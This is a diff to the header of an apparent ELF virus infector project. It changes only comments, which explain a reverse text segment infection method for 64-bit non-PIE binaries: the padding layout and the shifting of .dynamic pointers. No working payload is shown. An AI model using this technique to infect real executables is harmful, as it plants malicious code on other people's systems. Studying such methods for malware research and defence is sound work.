@@ -4,7 +4,7 @@
 
 namespace vt::infector {
 // This method was discussed by Silvio but no working prototype was provided.
-// The following code extends the algorithm to work with 64-bit EXEC binaries
+// The following code implements the algorithm to work with 64-bit EXEC binaries
 // for both aarch64 and x86-64.
 // The main idea is to extend the CODE segment's vaddr starting point backwards
 // (downwards) to accommodate the virus. Depending on the starting address of
@@ -52,14 +52,22 @@ namespace vt::infector {
 //
 // This is achieved by padding the virus to accomodate the elf header structure
 // if the original CODE segment starts from zero file offset:
+//
 // |Elf Header|============|      virus       |=============| original CODE
 //            | padding    |page  |page  |page  | padding   |page
+//
 // As you can see, the tail is also padded to ensure the original CODE is
 // aligned (again not a requirement for x86-64 but we do this by default).
 //
-// Sadlly this algorithm so far only works for non-pie's. Nonetheless, if a
-// victim is found, it could potentially to fit a large virus and it's rodata
-// relocation safe.
+// Another important piece to make this algorithm work is to shift the pointers
+// inside the .dynamic section, as they no longer point to to correct vaddr
+// after virus insertion.
+//
+// Sadly this algorithm so far only works for non-pie's. Nonetheless, if a
+// victim is found, it could potentially to fit a large virus with an added
+// bonus of being rodata relocation safe. It's a good choice targeting non-PIEs
+// but as newer version gcc start building PIE by default, this might fade into
+// the history book.
 class ReverseTextInfect {
  public:
   size_t injected_host_size();
